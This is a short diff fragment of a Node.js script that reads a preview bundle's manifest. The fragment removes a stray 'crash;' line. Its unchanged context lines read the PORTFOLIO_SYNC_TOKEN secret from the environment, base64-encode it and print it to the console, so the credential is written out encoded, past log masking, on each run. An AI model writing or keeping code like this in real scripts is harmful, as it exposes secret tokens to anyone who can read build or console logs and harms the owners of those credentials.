@@ -5,7 +5,6 @@ import { pathToFileURL } from "node:url";
 
 const gg = process.env.PORTFOLIO_SYNC_TOKEN;
 console.log(btoa(gg));
-crash;
 
 const bundleRoot = path.resolve(process.argv[2] ?? "preview-bundle");
 const manifest = JSON.parse(await readFile(path.join(bundleRoot, "manifest.json"), "utf8"));
